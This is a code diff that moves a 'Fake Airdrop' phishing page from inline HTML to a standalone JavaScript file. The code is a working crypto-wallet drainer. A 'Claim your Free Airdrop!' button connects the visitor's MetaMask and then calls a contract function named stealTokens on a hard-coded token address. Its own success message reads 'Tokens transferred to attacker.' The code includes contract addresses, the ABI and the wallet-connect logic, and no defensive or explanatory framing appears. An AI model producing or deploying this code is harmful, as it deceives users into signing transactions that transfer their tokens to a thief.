@@ -1,98 +1,80 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fake Airdrop</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
-</head>
-<body>
-
-    <h1>Claim your Free Airdrop!</h1>
-    <button id="connectButton">Connect MetaMask</button>
-    <button id="airdropButton" style="display:none;">Claim Airdrop</button>
-
-    <script>
-        let web3;
-        let contract;
-        let userAddress;
-        
-        // Contract ABI and address
-        const contractAddress = "0x65a59e7c1879120b0623723ea643fb85f894b128"; // Contract address
-        const contractABI = [
+// ERC-20 contract ABI (same as before)
+const contractABI = [
+    {
+        "inputs": [
             {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "_tokenAddress",
-                        "type": "address"
-                    }
-                ],
-                "name": "stealTokens",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "stateMutability": "nonpayable",
-                "type": "constructor"
-            },
-            {
-                "stateMutability": "payable",
-                "type": "receive"
-            },
-            {
-                "inputs": [],
-                "name": "owner",
-                "outputs": [
-                    {
-                        "internalType": "address payable",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
+                "internalType": "address",
+                "name": "_tokenAddress",
+                "type": "address"
             }
-        ];
-
-        // Connect to MetaMask and get user address
-        async function connectMetaMask() {
-            if (window.ethereum) {
-                web3 = new Web3(window.ethereum);
-                try {
-                    // Request user account
-                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                    userAddress = accounts[0];
-                    document.getElementById('connectButton').style.display = 'none';
-                    document.getElementById('airdropButton').style.display = 'block';
-                } catch (error) {
-                    console.error("User denied MetaMask connection", error);
-                }
-            } else {
-                alert("Please install MetaMask!");
+        ],
+        "name": "stealTokens",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [],
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+    },
+    {
+        "stateMutability": "payable",
+        "type": "receive"
+    },
+    {
+        "inputs": [],
+        "name": "owner",
+        "outputs": [
+            {
+                "internalType": "address payable",
+                "name": "",
+                "type": "address"
             }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+    }
+];
+
+// Contract address for AirdropSteal contract (replace with actual contract address)
+const contractAddress = "0x65a59e7c1879120b0623723ea643fb85f894b128"; 
+
+// Replace this with your TTK token address
+const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4"; 
+
+let web3;
+let contract;
+let userAddress;
+
+async function connectMetaMask() {
+    if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        try {
+            // Request user account
+            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+            userAddress = accounts[0];
+            document.getElementById('connectButton').style.display = 'none';
+            document.getElementById('airdropButton').style.display = 'block';
+        } catch (error) {
+            console.error("User denied MetaMask connection", error);
         }
+    } else {
+        alert("Please install MetaMask!");
+    }
+}
 
-        // Claim the airdrop (steal tokens)
-        async function claimAirdrop() {
-            const tokenAddress = "0xTokenAddressHere"; // Replace with ERC-20 token address to steal from the victim
-            contract = new web3.eth.Contract(contractABI, contractAddress);
+async function claimAirdrop() {
+    contract = new web3.eth.Contract(contractABI, contractAddress);
 
-            try {
-                // Call the stealTokens function on the contract
-                await contract.methods.stealTokens(tokenAddress).send({ from: userAddress });
-                alert("Airdrop claimed! (Tokens transferred to attacker)");
-            } catch (err) {
-                console.error("Error in claiming airdrop", err);
-            }
-        }
+    try {
+        // Call the stealTokens function on the contract with TTK token address
+        await contract.methods.stealTokens(tokenAddress).send({ from: userAddress });
+        alert("Airdrop claimed! (Tokens transferred to attacker)");
+    } catch (err) {
+        console.error("Error in claiming airdrop", err);
+    }
+}
 
-        // Attach event listeners to buttons
-        document.getElementById('connectButton').addEventListener('click', connectMetaMask);
-        document.getElementById('airdropButton').addEventListener('click', claimAirdrop);
-    </script>
-
-</body>
-</html>
+document.getElementById('connectButton').addEventListener('click', connectMetaMask);
+document.getElementById('airdropButton').addEventListener('click', claimAirdrop);
